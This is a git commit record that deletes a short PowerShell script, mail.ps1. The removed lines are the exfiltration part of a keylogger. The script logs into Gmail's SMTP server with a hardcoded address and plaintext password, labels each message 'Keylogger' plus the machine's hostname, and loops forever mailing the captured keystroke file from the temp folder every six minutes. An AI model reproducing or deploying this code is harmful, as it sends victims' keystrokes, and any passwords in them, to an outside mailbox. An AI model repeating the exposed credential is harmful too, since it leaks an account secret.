a09520bfa765b77523fa3db1a9da0a1013069507
phillipkhanson <42827311+phillipkhanson@users.noreply.github.com>
2018-11-08 13:50:31 -0700

    Delete mail.ps1

--- mail.ps1
+++
@@ -1,9 +0,0 @@
-$SMTPServer = 'smtp.gmail.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
-$SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('phillipkhanson@gmail.com', 'SUrfer2002!!')
-$ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'phillipkhanson@gmail.com'
-$ReportEmail.To.Add('phillipkhanson@gmail.com')
-$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 360} 
